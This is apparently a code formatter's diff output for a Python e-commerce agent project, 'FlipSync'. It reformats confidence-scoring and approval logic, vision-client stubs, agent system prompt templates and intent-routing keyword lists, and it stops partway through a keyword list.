             weights = cls.CONFIDENCE_WEIGHTS.get(agent_type, {})
             if not weights:
-                logger.warning(f"No confidence weights defined for agent type: {agent_type}")
+                logger.warning(
+                    f"No confidence weights defined for agent type: {agent_type}"
+                )
                 return 0.5  # Default moderate confidence
-            
+
             total_score = 0.0
             total_weight = 0.0
-            
+
             # Calculate weighted confidence based on available metrics
             for metric, weight in weights.items():
                 value = None
-                
+
                 # Extract metric value from response_data
                 if metric in response_data:
                     value = response_data[metric]
                 elif metrics and metric in metrics:
                     value = metrics[metric]
                 elif "scores" in response_data and metric in response_data["scores"]:
                     value = response_data["scores"][metric]
-                
+
                 if value is not None:
                     # Normalize value to 0-1 range if needed
                     normalized_value = cls._normalize_metric_value(value, metric)
                     total_score += normalized_value * weight
                     total_weight += weight
-            
+
             # Calculate final confidence
             if total_weight > 0:
                 confidence = total_score / total_weight
             else:
                 # Fallback confidence calculation
-                confidence = cls._calculate_fallback_confidence(agent_type, response_data)
-            
+                confidence = cls._calculate_fallback_confidence(
+                    agent_type, response_data
+                )
+
             # Ensure confidence is within valid range
             return max(0.0, min(1.0, confidence))
-            
+
         except Exception as e:
             logger.error(f"Error calculating confidence for {agent_type}: {e}")
             return 0.5  # Default moderate confidence on error
-    
-    @classmethod
-    def _normalize_metric_value(cls, value: Union[float, int, str], metric: str) -> float:
+
+    @classmethod
+    def _normalize_metric_value(
+        cls, value: Union[float, int, str], metric: str
+    ) -> float:
         """Normalize metric value to 0-1 range."""
         try:
             if isinstance(value, str):
                 # Handle string values (e.g., "high", "medium", "low")
                 value_map = {"low": 0.3, "medium": 0.6, "high": 0.9}
                 return value_map.get(value.lower(), 0.5)
-            
+
             numeric_value = float(value)
-            
+
             # Handle different metric scales
             if metric in ["seo_score", "readability", "quality_score"]:
                 # Assume 0-100 scale
                 return numeric_value / 100.0
             elif metric in ["cost_optimization", "delivery_reliability"]:
                 # Assume percentage (0-1 or 0-100)
                 return numeric_value if numeric_value <= 1.0 else numeric_value / 100.0
             else:
                 # Assume already normalized (0-1)
                 return numeric_value if numeric_value <= 1.0 else numeric_value / 100.0
-                
+
         except (ValueError, TypeError):
             return 0.5  # Default value for invalid inputs
-    
-    @classmethod
-    def _calculate_fallback_confidence(cls, agent_type: str, response_data: Dict[str, Any]) -> float:
+
+    @classmethod
+    def _calculate_fallback_confidence(
+        cls, agent_type: str, response_data: Dict[str, Any]
+    ) -> float:
         """Calculate fallback confidence when standard metrics are unavailable."""
         try:
             # Basic heuristics based on response characteristics
             confidence_factors = []
-            
+
             # Response completeness
             if "content" in response_data and response_data["content"]:
                 content_length = len(str(response_data["content"]))
                 if content_length > 100:
                     confidence_factors.append(0.8)
                 elif content_length > 50:
                     confidence_factors.append(0.6)
                 else:
                     confidence_factors.append(0.4)
-            
+
             # Data availability
             data_fields = ["data", "analysis", "recommendations", "results"]
-            available_data = sum(1 for field in data_fields if field in response_data and response_data[field])
+            available_data = sum(
+                1
+                for field in data_fields
+                if field in response_data and response_data[field]
+            )
             if available_data > 0:
                 confidence_factors.append(0.5 + (available_data * 0.1))
-            
+
             # Agent-specific factors
             if agent_type == "content":
                 if "keywords" in response_data and response_data["keywords"]:
                     confidence_factors.append(0.7)
             elif agent_type == "logistics":
-                if "cost_savings" in response_data or "efficiency_gain" in response_data:
+                if (
+                    "cost_savings" in response_data
+                    or "efficiency_gain" in response_data
+                ):
                     confidence_factors.append(0.75)
             elif agent_type == "executive":
                 if "financial_impact" in response_data or "roi" in response_data:
                     confidence_factors.append(0.8)
-            
-            return sum(confidence_factors) / len(confidence_factors) if confidence_factors else 0.5
-            
+
+            return (
+                sum(confidence_factors) / len(confidence_factors)
+                if confidence_factors
+                else 0.5
+            )
+
         except Exception as e:
             logger.error(f"Error in fallback confidence calculation: {e}")
             return 0.5
-    
+
     @classmethod
     def determine_approval_requirements(
         cls,
         agent_type: str,
         request_type: str,
         confidence: float,
-        response_data: Optional[Dict[str, Any]] = None
+        response_data: Optional[Dict[str, Any]] = None,
     ) -> Dict[str, Any]:
         """
         Determine approval requirements based on agent type, request type, and confidence.
-        
+
         Args:
             agent_type: Type of agent
             request_type: Type of request being processed
             confidence: Calculated confidence score
             response_data: Optional response data for additional context
-            
+
         Returns:
             Dictionary with approval requirements
         """
         try:
             # Get thresholds for agent and request type
             agent_thresholds = cls.APPROVAL_THRESHOLDS.get(agent_type, {})
-            request_thresholds = agent_thresholds.get(request_type, {
-                "auto_approve": 0.8,
-                "requires_human": 0.6
-            })
-            
+            request_thresholds = agent_thresholds.get(
+                request_type, {"auto_approve": 0.8, "requires_human": 0.6}
+            )
+
             auto_approve_threshold = request_thresholds["auto_approve"]
             human_approval_threshold = request_thresholds["requires_human"]
-            
+
             # Determine approval status
             if confidence >= auto_approve_threshold:
                 requires_approval = False
                 auto_approve = True
                 escalation_required = False
@@ -239,73 +257,79 @@
             else:
                 requires_approval = True
                 auto_approve = False
                 escalation_required = True
                 approval_reason = "Low confidence - requires escalation"
-            
+
             # Check for special conditions that always require approval
             if response_data:
                 high_impact_indicators = [
-                    "budget_change", "strategic_shift", "policy_change",
-                    "high_cost", "high_risk", "regulatory_impact"
+                    "budget_change",
+                    "strategic_shift",
+                    "policy_change",
+                    "high_cost",
+                    "high_risk",
+                    "regulatory_impact",
                 ]
-                
-                if any(indicator in response_data for indicator in high_impact_indicators):
+
+                if any(
+                    indicator in response_data for indicator in high_impact_indicators
+                ):
                     requires_approval = True
                     auto_approve = False
                     approval_reason += " - High impact decision"
-            
+
             return {
                 "requires_approval": requires_approval,
                 "auto_approve": auto_approve,
                 "escalation_required": escalation_required,
                 "approval_reason": approval_reason,
                 "confidence_threshold_met": confidence >= auto_approve_threshold,
-                "human_threshold_met": confidence >= human_approval_threshold
+                "human_threshold_met": confidence >= human_approval_threshold,
             }
-            
+
         except Exception as e:
             logger.error(f"Error determining approval requirements: {e}")
             return {
                 "requires_approval": True,
                 "auto_approve": False,
                 "escalation_required": True,
                 "approval_reason": "Error in approval determination - requires manual review",
                 "confidence_threshold_met": False,
-                "human_threshold_met": False
+                "human_threshold_met": False,
             }
-    
+
     @classmethod
     def format_standard_metadata(
         cls,
         agent_type: str,
         request_type: str,
         response_data: Dict[str, Any],
         confidence: float,
         processing_time: float,
-        additional_metadata: Optional[Dict[str, Any]] = None
+        additional_metadata: Optional[Dict[str, Any]] = None,
     ) -> Dict[str, Any]:
         """
         Format standardized metadata for agent responses.
-        
+
         Args:
             agent_type: Type of agent
             request_type: Type of request
             response_data: Response data
             confidence: Calculated confidence
             processing_time: Time taken to process request
             additional_metadata: Optional additional metadata
-            
+
         Returns:
             Standardized metadata dictionary
         """
         try:
             # Get approval requirements
             approval_info = cls.determine_approval_requirements(
                 agent_type, request_type, confidence, response_data
             )
-            
+
             # Build standard metadata
             metadata = {
                 "agent_type": agent_type,
                 "request_type": request_type,
                 "confidence": confidence,
@@ -317,107 +341,122 @@
                 "approval_reason": approval_info["approval_reason"],
                 "data": response_data.get("metadata", {}),
                 "performance_metrics": {
                     "response_time": processing_time,
                     "confidence_score": confidence,
-                    "data_quality": response_data.get("quality_score", 0.5)
-                }
+                    "data_quality": response_data.get("quality_score", 0.5),
+                },
             }
-            
+
             # Add agent-specific metadata
             if agent_type == "content":
-                metadata.update({
-                    "seo_optimized": response_data.get("seo_score", 0) > 0.7,
-                    "word_count": response_data.get("word_count", 0),
-                    "readability_score": response_data.get("readability_score", 0.5)
-                })
+                metadata.update(
+                    {
+                        "seo_optimized": response_data.get("seo_score", 0) > 0.7,
+                        "word_count": response_data.get("word_count", 0),
+                        "readability_score": response_data.get(
+                            "readability_score", 0.5
+                        ),
+                    }
+                )
             elif agent_type == "logistics":
-                metadata.update({
-                    "cost_optimized": response_data.get("cost_savings", 0) > 0,
-                    "delivery_optimized": response_data.get("delivery_improvement", 0) > 0,
-                    "carrier_recommendations": len(response_data.get("carriers", []))
-                })
+                metadata.update(
+                    {
+                        "cost_optimized": response_data.get("cost_savings", 0) > 0,
+                        "delivery_optimized": response_data.get(
+                            "delivery_improvement", 0
+                        )
+                        > 0,
+                        "carrier_recommendations": len(
+                            response_data.get("carriers", [])
+                        ),
+                    }
+                )
             elif agent_type == "executive":
-                metadata.update({
-                    "financial_impact": response_data.get("financial_impact", 0),
-                    "risk_level": response_data.get("risk_level", "medium"),
-                    "strategic_alignment": response_data.get("strategic_alignment", 0.5)
-                })
-            
+                metadata.update(
+                    {
+                        "financial_impact": response_data.get("financial_impact", 0),
+                        "risk_level": response_data.get("risk_level", "medium"),
+                        "strategic_alignment": response_data.get(
+                            "strategic_alignment", 0.5
+                        ),
+                    }
+                )
+
             # Merge additional metadata
             if additional_metadata:
                 metadata.update(additional_metadata)
-            
+
             return metadata
-            
+
         except Exception as e:
             logger.error(f"Error formatting metadata: {e}")
             return {
                 "agent_type": agent_type,
                 "request_type": request_type,
                 "confidence": confidence,
                 "processing_time": processing_time,
                 "timestamp": datetime.now(timezone.utc).isoformat(),
                 "requires_approval": True,
-                "error": str(e)
+                "error": str(e),
             }
-    
+
     @classmethod
     def create_standardized_response(
         cls,
         content: str,
         agent_type: str,
         request_type: str,
         response_data: Dict[str, Any],
         processing_start_time: float,
         agent_id: Optional[str] = None,
-        additional_metadata: Optional[Dict[str, Any]] = None
+        additional_metadata: Optional[Dict[str, Any]] = None,
     ) -> AgentResponse:
         """
         Create a standardized AgentResponse with calculated confidence and metadata.
-        
+
         Args:
             content: Response content
             agent_type: Type of agent
             request_type: Type of request
             response_data: Response data for confidence calculation
             processing_start_time: Start time for processing duration calculation
             agent_id: Optional agent identifier
             additional_metadata: Optional additional metadata
-            
+
         Returns:
             Standardized AgentResponse object
         """
         try:
             # Calculate processing time
             processing_time = time.time() - processing_start_time
-            
+
             # Calculate confidence
             confidence = cls.calculate_confidence(agent_type, response_data)
-            
+
             # Format metadata
             metadata = cls.format_standard_metadata(
                 agent_type=agent_type,
                 request_type=request_type,
                 response_data=response_data,
                 confidence=confidence,
                 processing_time=processing_time,
-                additional_metadata=additional_metadata
-            )
-            
+                additional_metadata=additional_metadata,
+            )
+
             # Add agent ID if provided
             if agent_id:
                 metadata["agent_id"] = agent_id
-            
+
             return AgentResponse(
                 content=content,
                 agent_type=agent_type,
                 confidence=confidence,
                 response_time=processing_time,
-                metadata=metadata
-            )
-            
+                metadata=metadata,
+            )
+
         except Exception as e:
             logger.error(f"Error creating standardized response: {e}")
             # Return error response
             return AgentResponse(
                 content=f"Error processing request: {str(e)}",
@@ -426,8 +465,8 @@
                 response_time=time.time() - processing_start_time,
                 metadata={
                     "error": str(e),
                     "requires_approval": True,
                     "agent_type": agent_type,
-                    "timestamp": datetime.now(timezone.utc).isoformat()
-                }
-            )
+                    "timestamp": datetime.now(timezone.utc).isoformat(),
+                },
+            )
would reformat /home/brend/Flipsync_Final/fs_agt_clean/core/agents/response_processor.py
--- /home/brend/Flipsync_Final/fs_agt_clean/core/ai/vision_clients.py	2025-06-14 20:35:30.775706+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/core/ai/vision_clients.py	2025-06-19 04:03:47.478257+00:00
@@ -12,89 +12,125 @@
 from typing import Optional, Dict, Any
 from enum import Enum
 
 logger = logging.getLogger(__name__)
 
+
 # Enum for vision service types
 class VisionServiceType(Enum):
     """Stub enum for VisionServiceType - legacy implementation archived."""
+
     LOCAL_LLAVA = "local_llava"
     CLOUD_GPT4 = "cloud_gpt4"
+
 
 # Stub for enhanced_vision_manager to prevent import errors
 class EnhancedVisionManager:
     """Stub for enhanced vision manager - legacy implementation archived."""
-    
+
     def __init__(self, config: Optional[Dict] = None):
         """Initialize stub vision manager."""
         self.config = config or {}
-        logger.warning("Enhanced Vision Manager is using stub implementation - legacy code archived")
-    
+        logger.warning(
+            "Enhanced Vision Manager is using stub implementation - legacy code archived"
+        )
+
     async def analyze_image(self, *args, **kwargs):
         """Stub method for image analysis."""
-        logger.warning("Vision analysis not available - use SimpleLLMClient for AI capabilities")
+        logger.warning(
+            "Vision analysis not available - use SimpleLLMClient for AI capabilities"
+        )
         return {"error": "Vision analysis not available in current implementation"}
+
 
 # Stub classes for compatibility with legacy imports
 class VisionCapableOllamaClient:
     """Stub for VisionCapableOllamaClient - legacy implementation archived."""
 
     def __init__(self, *args, **kwargs):
-        logger.warning("VisionCapableOllamaClient is using stub implementation - legacy code archived")
+        logger.warning(
+            "VisionCapableOllamaClient is using stub implementation - legacy code archived"
+        )
 
     async def analyze_image(self, *args, **kwargs):
-        logger.warning("Vision analysis not available - use SimpleLLMClient for AI capabilities")
+        logger.warning(
+            "Vision analysis not available - use SimpleLLMClient for AI capabilities"
+        )
         return {"error": "Vision analysis not available in current implementation"}
+
 
 class VisionAnalysisService:
     """Stub for VisionAnalysisService - legacy implementation archived."""
 
     def __init__(self, *args, **kwargs):
-        logger.warning("VisionAnalysisService is using stub implementation - legacy code archived")
+        logger.warning(
+            "VisionAnalysisService is using stub implementation - legacy code archived"
+        )
 
     async def analyze_image(self, *args, **kwargs):
-        logger.warning("Vision analysis not available - use SimpleLLMClient for AI capabilities")
+        logger.warning(
+            "Vision analysis not available - use SimpleLLMClient for AI capabilities"
+        )
         return {"error": "Vision analysis not available in current implementation"}
+
 
 class ImageAnalysisResult:
     """Stub for ImageAnalysisResult - legacy implementation archived."""
 
     def __init__(self, *args, **kwargs):
         self.analysis = "Vision analysis not available in current implementation"
         self.confidence = 0.0
-        logger.warning("ImageAnalysisResult is using stub implementation - legacy code archived")
+        logger.warning(
+            "ImageAnalysisResult is using stub implementation - legacy code archived"
+        )
+
 
 # Additional stub classes for ai_routes.py compatibility
 class GPT4VisionClient:
     """Stub for GPT4VisionClient - legacy implementation archived."""
 
     def __init__(self, *args, **kwargs):
-        logger.warning("GPT4VisionClient is using stub implementation - legacy code archived")
+        logger.warning(
+            "GPT4VisionClient is using stub implementation - legacy code archived"
+        )
 
     async def analyze_image(self, *args, **kwargs):
-        logger.warning("Vision analysis not available - use SimpleLLMClient for AI capabilities")
+        logger.warning(
+            "Vision analysis not available - use SimpleLLMClient for AI capabilities"
+        )
         return {"error": "Vision analysis not available in current implementation"}
+
 
 class OllamaVisionClient:
     """Stub for OllamaVisionClient - legacy implementation archived."""
 
     def __init__(self, *args, **kwargs):
-        logger.warning("OllamaVisionClient is using stub implementation - legacy code archived")
+        logger.warning(
+            "OllamaVisionClient is using stub implementation - legacy code archived"
+        )
 
     async def analyze_image(self, *args, **kwargs):
-        logger.warning("Vision analysis not available - use SimpleLLMClient for AI capabilities")
+        logger.warning(
+            "Vision analysis not available - use SimpleLLMClient for AI capabilities"
+        )
         return {"error": "Vision analysis not available in current implementation"}
+
 
 class VisionClientFactory:
     """Stub for VisionClientFactory - legacy implementation archived."""
 
     def __init__(self, *args, **kwargs):
-        logger.warning("VisionClientFactory is using stub implementation - legacy code archived")
+        logger.warning(
+            "VisionClientFactory is using stub implementation - legacy code archived"
+        )
 
     def create_client(self, *args, **kwargs):
-        logger.warning("Vision client creation not available - use SimpleLLMClient for AI capabilities")
+        logger.warning(
+            "Vision client creation not available - use SimpleLLMClient for AI capabilities"
+        )
         return GPT4VisionClient()
+
 
 # Create global instances for compatibility
 enhanced_vision_manager = EnhancedVisionManager()
 vision_analysis_service = VisionAnalysisService()
 gpt4_vision_client = GPT4VisionClient()
would reformat /home/brend/Flipsync_Final/fs_agt_clean/core/ai/vision_clients.py
--- /home/brend/Flipsync_Final/fs_agt_clean/core/ai/prompt_templates.py	2025-06-14 20:35:30.775706+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/core/ai/prompt_templates.py	2025-06-19 04:03:47.582374+00:00
@@ -12,58 +12,61 @@
 from enum import Enum
 
 
 class AgentRole(str, Enum):
     """Agent roles for prompt templates."""
+
     MARKET = "market"
     ANALYTICS = "analytics"
     LOGISTICS = "logistics"
     CONTENT = "content"
     EXECUTIVE = "executive"
     ASSISTANT = "assistant"
 
 
 class PromptType(str, Enum):
     """Types of prompts."""
+
     SYSTEM = "system"
     HANDOFF = "handoff"
     CONTEXT = "context"
     RESPONSE = "response"
 
 
 @dataclass
 class PromptTemplate:
     """Template for generating prompts."""
+
     role: AgentRole
     prompt_type: PromptType
     template: str
     variables: List[str]
     description: str
 
 
 class PromptTemplateManager:
     """Manager for AI prompt templates across different agent types."""
-    
+
     def __init__(self):
         """Initialize prompt templates."""
         self.templates = self._initialize_templates()
-    
+
     def _initialize_templates(self) -> Dict[str, PromptTemplate]:
         """Initialize all prompt templates."""
         templates = {}
-        
+
         # System prompts for each agent type
         templates.update(self._create_system_prompts())
-        
+
         # Handoff prompts
         templates.update(self._create_handoff_prompts())
-        
+
         # Context prompts
         templates.update(self._create_context_prompts())
-        
+
         return templates
-    
+
     def _create_system_prompts(self) -> Dict[str, PromptTemplate]:
         """Create system prompts for each agent type."""
         return {
             "market_system": PromptTemplate(
                 role=AgentRole.MARKET,
@@ -97,13 +100,12 @@
 - Product categories: {categories}
 - Current performance metrics: {metrics}
 
 Always provide practical, implementable advice that directly impacts business performance.""",
                 variables=["business_type", "marketplaces", "categories", "metrics"],
-                description="System prompt for Market Intelligence Agent"
-            ),
-            
+                description="System prompt for Market Intelligence Agent",
+            ),
             "analytics_system": PromptTemplate(
                 role=AgentRole.ANALYTICS,
                 prompt_type=PromptType.SYSTEM,
                 template="""You are an Analytics Agent for FlipSync, specializing in business intelligence and performance analysis.
 
@@ -134,13 +136,12 @@
 - Comparison benchmarks: {benchmarks}
 - Data sources available: {data_sources}
 
 Focus on translating complex data into clear, actionable business insights.""",
                 variables=["period", "key_metrics", "benchmarks", "data_sources"],
-                description="System prompt for Analytics Agent"
-            ),
-            
+                description="System prompt for Analytics Agent",
+            ),
             "logistics_system": PromptTemplate(
                 role=AgentRole.LOGISTICS,
                 prompt_type=PromptType.SYSTEM,
                 template="""You are a Logistics Optimization Agent for FlipSync, expert in supply chain and fulfillment operations.
 
@@ -170,14 +171,18 @@
 - Primary carriers: {carriers}
 - Fulfillment methods: {fulfillment_methods}
 - Geographic coverage: {coverage}
 
 Prioritize solutions that balance cost efficiency with customer satisfaction.""",
-                variables=["shipping_volume", "carriers", "fulfillment_methods", "coverage"],
-                description="System prompt for Logistics Agent"
-            ),
-            
+                variables=[
+                    "shipping_volume",
+                    "carriers",
+                    "fulfillment_methods",
+                    "coverage",
+                ],
+                description="System prompt for Logistics Agent",
+            ),
             "content_system": PromptTemplate(
                 role=AgentRole.CONTENT,
                 prompt_type=PromptType.SYSTEM,
                 template="""You are a Content Optimization Agent for FlipSync, specializing in marketplace content creation and SEO.
 
@@ -207,14 +212,18 @@
 - Product categories: {categories}
 - Current conversion rates: {conversion_rates}
 - Competitor analysis: {competitor_analysis}
 
 Create content that drives both visibility and conversions.""",
-                variables=["marketplaces", "categories", "conversion_rates", "competitor_analysis"],
-                description="System prompt for Content Agent"
-            ),
-            
+                variables=[
+                    "marketplaces",
+                    "categories",
+                    "conversion_rates",
+                    "competitor_analysis",
+                ],
+                description="System prompt for Content Agent",
+            ),
             "executive_system": PromptTemplate(
                 role=AgentRole.EXECUTIVE,
                 prompt_type=PromptType.SYSTEM,
                 template="""You are an Executive Decision Agent for FlipSync, providing strategic business guidance and high-level decision support.
 
@@ -244,14 +253,18 @@
 - Growth objectives: {growth_objectives}
 - Available resources: {resources}
 - Market opportunities: {opportunities}
 
 Think strategically and provide guidance that drives sustainable business growth.""",
-                variables=["business_stage", "growth_objectives", "resources", "opportunities"],
-                description="System prompt for Executive Agent"
-            ),
-            
+                variables=[
+                    "business_stage",
+                    "growth_objectives",
+                    "resources",
+                    "opportunities",
+                ],
+                description="System prompt for Executive Agent",
+            ),
             "assistant_system": PromptTemplate(
                 role=AgentRole.ASSISTANT,
                 prompt_type=PromptType.SYSTEM,
                 template="""You are the FlipSync Assistant, an AI sales optimization expert specifically designed to help eBay sellers sell faster and earn more through intelligent automation.
 
@@ -306,15 +319,20 @@
 - Sales performance: {sales_performance}
 - Optimization goals: {optimization_goals}
 - Available features: {available_features}
 
 Start every conversation by understanding their biggest opportunity for immediate profit improvement.""",
-                variables=["business_type", "sales_performance", "optimization_goals", "available_features"],
-                description="FlipSync-specific assistant prompt for eBay sales optimization"
-            )
+                variables=[
+                    "business_type",
+                    "sales_performance",
+                    "optimization_goals",
+                    "available_features",
+                ],
+                description="FlipSync-specific assistant prompt for eBay sales optimization",
+            ),
         }
-    
+
     def _create_handoff_prompts(self) -> Dict[str, PromptTemplate]:
         """Create handoff prompts for agent transitions."""
         return {
             "handoff_context": PromptTemplate(
                 role=AgentRole.ASSISTANT,
@@ -326,15 +344,20 @@
 
 The {target_agent} agent has access to specialized tools and expertise for:
 {agent_capabilities}
 
 They'll be able to provide you with detailed insights and actionable recommendations. Please continue with your question, and they'll pick up right where we left off.""",
-                variables=["target_agent", "query_type", "conversation_summary", "agent_capabilities"],
-                description="Handoff context for agent transitions"
+                variables=[
+                    "target_agent",
+                    "query_type",
+                    "conversation_summary",
+                    "agent_capabilities",
+                ],
+                description="Handoff context for agent transitions",
             )
         }
-    
+
     def _create_context_prompts(self) -> Dict[str, PromptTemplate]:
         """Create context prompts for maintaining conversation state."""
         return {
             "conversation_context": PromptTemplate(
                 role=AgentRole.ASSISTANT,
@@ -346,62 +369,67 @@
 Key topics discussed: {topics}
 Current objectives: {objectives}
 Relevant data points: {data_points}
 
 Continue the conversation naturally, building on this context.""",
-                variables=["user_name", "start_time", "previous_agent", "topics", "objectives", "data_points"],
-                description="Context prompt for conversation continuity"
+                variables=[
+                    "user_name",
+                    "start_time",
+                    "previous_agent",
+                    "topics",
+                    "objectives",
+                    "data_points",
+                ],
+                description="Context prompt for conversation continuity",
             )
         }
-    
+
     def get_system_prompt(
-        self, 
-        agent_role: AgentRole, 
-        context_variables: Optional[Dict[str, Any]] = None
+        self, agent_role: AgentRole, context_variables: Optional[Dict[str, Any]] = None
     ) -> str:
         """Get system prompt for an agent role."""
         template_key = f"{agent_role.value}_system"
         template = self.templates.get(template_key)
-        
+
         if not template:
             raise ValueError(f"No system template found for role: {agent_role}")
-        
+
         if context_variables:
             try:
                 return template.template.format(**context_variables)
             except KeyError as e:
                 # Fill missing variables with defaults
-                filled_variables = self._fill_missing_variables(template.variables, context_variables)
+                filled_variables = self._fill_missing_variables(
+                    template.variables, context_variables
+                )
                 return template.template.format(**filled_variables)
         else:
             # Fill all variables with defaults
             default_variables = self._get_default_variables(template.variables)
             return template.template.format(**default_variables)
-    
+
     def get_handoff_prompt(
-        self,
-        target_agent: AgentRole,
-        context_variables: Dict[str, Any]
+        self, target_agent: AgentRole, context_variables: Dict[str, Any]
     ) -> str:
         """Get handoff prompt for agent transition."""
         template = self.templates["handoff_context"]
-        
+
         # Add target agent capabilities
         agent_capabilities = self._get_agent_capabilities(target_agent)
         context_variables["agent_capabilities"] = agent_capabilities
-        
-        filled_variables = self._fill_missing_variables(template.variables, context_variables)
+
+        filled_variables = self._fill_missing_variables(
+            template.variables, context_variables
+        )
         return template.template.format(**filled_variables)
-    
+
     def _fill_missing_variables(
-        self, 
-        required_variables: List[str], 
-        provided_variables: Dict[str, Any]
+        self, required_variables: List[str], provided_variables: Dict[str, Any]
     ) -> Dict[str, Any]:
         """Fill missing variables with appropriate defaults."""
         filled = provided_variables.copy()
-        
+
         defaults = {
             "business_type": "eBay reseller business",
             "marketplaces": "eBay, Amazon",
             "categories": "electronics, collectibles, fashion, home goods",
             "metrics": "sales velocity, profit margins, listing views",
@@ -423,42 +451,39 @@
             "features_used": "listing optimization, pricing analysis",
             "recent_activity": "product listing and optimization",
             "available_agents": "Market, Content, Logistics, Executive agents",
             "sales_performance": "moderate sales with optimization potential",
             "optimization_goals": "faster sales and higher profits",
-            "available_features": "AI listing optimization, pricing analysis, shipping optimization"
+            "available_features": "AI listing optimization, pricing analysis, shipping optimization",
         }
-        
+
         for var in required_variables:
             if var not in filled:
                 filled[var] = defaults.get(var, f"[{var}]")
-        
+
         return filled
-    
+
     def _get_default_variables(self, variables: List[str]) -> Dict[str, Any]:
         """Get default values for all variables."""
         return self._fill_missing_variables(variables, {})
-    
+
     def _get_agent_capabilities(self, agent_role: AgentRole) -> str:
         """Get capabilities description for an agent role."""
         capabilities = {
             AgentRole.MARKET: "pricing analysis, inventory management, competitor monitoring, marketplace optimization",
             AgentRole.ANALYTICS: "performance reporting, data visualization, trend analysis, KPI tracking",
             AgentRole.LOGISTICS: "shipping optimization, fulfillment management, carrier coordination, cost reduction",
             AgentRole.CONTENT: "listing optimization, SEO enhancement, content creation, conversion improvement",
             AgentRole.EXECUTIVE: "strategic planning, decision support, risk analysis, business development",
-            AgentRole.ASSISTANT: "general support, platform guidance, troubleshooting, user assistance"
+            AgentRole.ASSISTANT: "general support, platform guidance, troubleshooting, user assistance",
         }
-        
+
         return capabilities.get(agent_role, "specialized assistance")
-    
+
     def list_templates(self) -> Dict[str, str]:
         """List all available templates."""
-        return {
-            key: template.description 
-            for key, template in self.templates.items()
-        }
-    
+        return {key: template.description for key, template in self.templates.items()}
+
     def get_template_variables(self, template_key: str) -> List[str]:
         """Get required variables for a template."""
         template = self.templates.get(template_key)
         return template.variables if template else []
would reformat /home/brend/Flipsync_Final/fs_agt_clean/core/ai/prompt_templates.py
--- /home/brend/Flipsync_Final/fs_agt_clean/core/agents/agent_communication.py	2025-06-16 21:42:44.899747+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/core/agents/agent_communication.py	2025-06-19 04:03:47.790722+00:00
@@ -12,18 +12,22 @@
 from typing import Dict, List, Optional, Any, Tuple
 from dataclasses import dataclass
 from enum import Enum
 from datetime import datetime, timezone
 
-from fs_agt_clean.agents.base_conversational_agent import BaseConversationalAgent, AgentResponse
+from fs_agt_clean.agents.base_conversational_agent import (
+    BaseConversationalAgent,
+    AgentResponse,
+)
 from fs_agt_clean.core.ai.llm_adapter import FlipSyncLLMFactory
 
 logger = logging.getLogger(__name__)
 
 
 class IntentType(str, Enum):
     """Types of user intents for agent routing."""
+
     PRICING = "pricing"
     COMPETITION = "competition"
     LISTING = "listing"
     SEO = "seo"
     SHIPPING = "shipping"
@@ -33,164 +37,238 @@
     GENERAL = "general"
 
 
 class AgentType(str, Enum):
     """Types of agents available for routing."""
+
     MARKET = "market"
     CONTENT = "content"
     LOGISTICS = "logistics"
     EXECUTIVE = "executive"
     LIAISON = "liaison"
 
 
 @dataclass
 class IntentRecognitionResult:
     """Result of intent recognition analysis."""
+
     intent: IntentType
     confidence: float
     target_agent: AgentType
     reasoning: str
     keywords_matched: List[str]
 
 
 @dataclass
 class AgentRoutingContext:
     """Context for agent routing decisions."""
+
     user_message: str
     conversation_id: str
     user_id: Optional[str]
     conversation_history: List[Dict[str, Any]]
     intent_result: Optional[IntentRecognitionResult]
     metadata: Dict[str, Any]
 
 
 class IntentRecognizer:
     """Recognizes user intent and determines appropriate agent routing."""
-    
+
     def __init__(self):
         """Initialize the intent recognizer."""
         self.intent_patterns = self._build_intent_patterns()
         logger.info("Intent recognizer initialized")
-    
+
     def _build_intent_patterns(self) -> Dict[IntentType, Dict[str, Any]]:
         """Build intent recognition patterns."""
         return {
             IntentType.PRICING: {
                 "keywords": [
-                    "price", "pricing", "cost", "expensive", "cheap", "value",
-                    "competitor price", "market price", "pricing strategy",
-                    "how much", "what price", "price point", "underpriced", "overpriced"
+                    "price",
+                    "pricing",
+                    "cost",
+                    "expensive",
+                    "cheap",
+                    "value",
+                    "competitor price",
+                    "market price",
+                    "pricing strategy",
+                    "how much",
+                    "what price",
+                    "price point",
+                    "underpriced",
+                    "overpriced",
                 ],
                 "target_agent": AgentType.MARKET,
-                "confidence_boost": 0.2
+                "confidence_boost": 0.2,
             },
             IntentType.COMPETITION: {
                 "keywords": [
-                    "competitor", "competition", "rival", "compare", "versus",
-                    "market analysis", "competitive", "benchmark", "outperform",
-                    "market share", "competitor analysis"
+                    "competitor",
+                    "competition",
+                    "rival",
+                    "compare",
+                    "versus",
+                    "market analysis",
+                    "competitive",
+                    "benchmark",
+                    "outperform",
+                    "market share",
+                    "competitor analysis",
                 ],
                 "target_agent": AgentType.MARKET,
-                "confidence_boost": 0.2
+                "confidence_boost": 0.2,
             },
             IntentType.LISTING: {
                 "keywords": [
-                    "listing", "title", "description", "content", "write",
-                    "optimize listing", "product description", "bullet points",
-                    "features", "benefits", "listing optimization"
+                    "listing",
+                    "title",
+                    "description",
+                    "content",
+                    "write",
+                    "optimize listing",
+                    "product description",
+                    "bullet points",
+                    "features",
+                    "benefits",
+                    "listing optimization",
                 ],
                 "target_agent": AgentType.CONTENT,
-                "confidence_boost": 0.2
+                "confidence_boost": 0.2,
             },
             IntentType.SEO: {
                 "keywords": [
-                    "seo", "search", "keywords", "visibility", "ranking",
-                    "search optimization", "findable", "discoverable",
-                    "search terms", "keyword research"
+                    "seo",
+                    "search",
+                    "keywords",
+                    "visibility",
+                    "ranking",
+                    "search optimization",
+                    "findable",
+                    "discoverable",
+                    "search terms",
+                    "keyword research",
                 ],
                 "target_agent": AgentType.CONTENT,
-                "confidence_boost": 0.2
+                "confidence_boost": 0.2,
             },
             IntentType.SHIPPING: {
                 "keywords": [
-                    "shipping", "delivery", "fulfillment", "carrier", "freight",
-                    "shipping cost", "delivery time", "logistics", "warehouse",
-                    "ship", "send", "mail"
+                    "shipping",
+                    "delivery",
+                    "fulfillment",
+                    "carrier",
+                    "freight",
+                    "shipping cost",
+                    "delivery time",
+                    "logistics",
+                    "warehouse",
+                    "ship",
+                    "send",
+                    "mail",
                 ],
                 "target_agent": AgentType.LOGISTICS,
-                "confidence_boost": 0.2
+                "confidence_boost": 0.2,
             },
             IntentType.INVENTORY: {
                 "keywords": [
-                    "inventory", "stock", "quantity", "reorder", "supply",
